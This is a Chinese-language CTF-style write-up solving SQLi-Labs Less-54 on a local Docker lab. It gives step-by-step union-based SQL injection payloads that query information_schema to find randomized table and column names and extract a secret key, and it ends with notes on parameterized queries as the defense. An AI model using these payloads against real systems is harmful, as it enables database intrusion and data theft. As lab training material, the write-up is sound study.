SQLi-Labs Less-54

2026年9月30日 SQLi-Labs Web安全 SQL注入 挑战模式 / 联合查询注入

一、题目信息

  • 题目名称：SQLi-Labs Less-54 (GET - challenge - Union - 10 queries allowed - Variation 1)
  • 题目平台：SQLi-Labs 本地靶场（Docker 环境）
  • 题目类型：Web安全 / SQL注入 / 挑战模式 / 联合查询注入 / 限制尝试次数
  • 靶场链接：http://localhost:8081/Less-54/（本地环境）
  • 涉及工具：Chrome浏览器 (地址栏直接注入)

二、解题步骤

1. 分析题目考什么

本题的核心考点是在限制尝试次数（10次）的情况下，完成联合查询注入。Less-54 是挑战模式的第一关，数据库表名、列名、密钥都是随机生成的。攻击者必须精打细算，利用 group_concat() 压缩查询次数，最终获取 Secret Key 并提交。

2. 怎么想（破题思路）

  • 页面提示 "You have made: X of 10 attempts"，明确限制只能查询 10 次。
  • 页面底部有 "Submit Secret Key" 输入框，表明目标是获取密钥并提交。
  • 利用 -1 使原查询落空，只回显联合查询结果。
  • 依次查询：字段数 -> 表名 -> 列名 -> 密钥数据。全程使用 group_concat() 合并结果，节省次数。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：-1 union select 1,2,3 无回显

踩坑情况：输入 ?id=-1 union select 1,2,3-- -，页面一片空白，没有任何回显。

原因分析：Less-54 是字符型注入（String），需要闭合单引号，或者因为 MySQL 8 对整数与字符串类型不匹配导致报错被屏蔽。

改进方式：改用带单引号的 Payload：?id=-1' union select 1,'2','3'-- -。确认回显后，再进行后续查询。

详细实操步骤（Payload逐字解释）

第一步：确定回显字段数（1次尝试）

?id=-1' union select 1,'2','3'-- -

页面回显 2 或 3，说明表有 3 列，且第 2/3 列为回显位。

第二步：获取随机表名（1次尝试）

?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'-- -

回显随机表名（如 FD518RSW4O）。

第三步：获取随机列名（1次尝试）

?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and table_name='FD518RSW4O'-- -

回显随机列名（如 id,sessid,secret_OL57,tryy）。

第四步：获取 Secret Key（1次尝试）

?id=-1' union select 1,group_concat(secret_OL57),3 from challenges.FD518RSW4O-- -

回显 Secret Key（如 AlimFaeHV4AOmhE19N6293Wf）。

第五步：提交密钥

将 Secret Key 粘贴到页面底部的输入框，点击 Submit 即可通关。

4. 怎么迁移（跨领域联想）

  • 应用场景联想：CTF 比赛中的 Web 题目经常限制请求次数（Rate Limiting），考察攻击者在资源受限情况下的效率。这与实战中的 WAF 拦截频率限制类似。
  • 防御策略联想：限制查询次数是一种有效的缓解措施，但不能根治漏洞。根本的防御依然是使用参数化查询（Prepared Statements）。
  • 安全开发启示：即使是查询次数受限，攻击者依然能通过联合查询获取敏感数据。这警示我们，不能在代码层依赖“频率限制”来防御注入。

三、名词大全与原理深度复盘

1. 挑战模式 (Challenge Mode)

SQLi-Labs 的高级关卡，通常限制尝试次数、随机化表名列名，模拟真实 CTF 或实战中的攻防对抗。

2. group_concat()

MySQL 中的聚合函数，用于将查询结果的多行合并为一个字符串。在受限次数的注入中非常关键，它能让我们一次获取所有表名或列名。

3. 联合查询注入 (Union-Based SQL Injection)

利用 UNION SELECT 将攻击者的查询结果拼接到原查询结果中，从而在页面回显位显示数据。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1 到 Less-53 的区别：之前的关卡没有次数限制，可以反复试错。Less-54 限制了 10 次尝试，且表名列名随机，考验攻击者的精确度。

2. 这种题目的出现原因（为什么存在）

比赛主办方或靶场设计者为了增加难度和挑战性，引入了随机化和限制次数的机制。这迫使攻击者从“暴力猜测”转向“精准信息收集”，是进阶高级渗透测试的必经之路。

3. 这种应用在实际中如何体现？

在实战中，遇到带有 WAF 的站点，如果单次请求被拦截，攻击者会尝试分包或利用其他漏洞绕过。在靶场中，这体现为利用 group_concat 一次性获取所有数据，避免多次触发风控。

4. 如何抽象理解概念（大白话）

把靶场比作一个“限时寻宝游戏”：

  • 你只有 10 次提问机会，宝藏藏在随机的地方。
  • 你不能像之前那样慢慢问“这里有没有？”，“那里有没有？”。
  • 你必须问：“把所有的藏宝图名字都告诉我（group_concat）”。
  • 最终拿到宝藏（Secret Key），提交即通关。这就是挑战模式的核心逻辑。
